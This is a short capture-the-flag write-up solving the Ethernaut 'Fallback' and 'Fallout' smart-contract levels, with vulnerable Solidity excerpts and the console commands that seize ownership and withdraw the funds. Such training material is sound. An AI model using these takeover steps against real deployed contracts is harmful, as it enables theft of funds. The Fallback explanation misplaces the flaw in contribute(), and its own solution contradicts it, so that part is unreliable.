# Ethernaut Solutions

Here are my solutions for the Ethernaut challenges.

# 1. Fallback

## Vulnerability

The vulnerability is in the contribute() function:

```
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
  ```
  
 If you send more funds to the contract than the current owner, you become the new owner. And once you claim ownership of the contract, you can call the withdraw() function to take the contract's funds.
 
 ```
function withdraw() public onlyOwner {
   owner.transfer(address(this).balance);
 }
 ```
 
  ## Solution
  ```
  await contract.contribute({value: 1})
  await contract.sendTransaction({value: 1})
  await contract.withdraw()
  ```


# 2. Fallout

## Vulnerability

The vulnerability is in the constructor:

```
function Fal1out() public payable {
   owner = msg.sender;
   allocations[owner] = msg.value;
 }
 ```
 
 If you look closely, you'll see that the name of the constructor is Fal**1**out, not Fallout. This spelling mistake allows it to be called as a regular function, and based on its logic, we can claim ownership of the contract by simpling sending funds to the contract.
 
 ## Solution
 
 ```
 await contract.Fal1out({value: 1})
 await contract.collectAllocations()
 ```
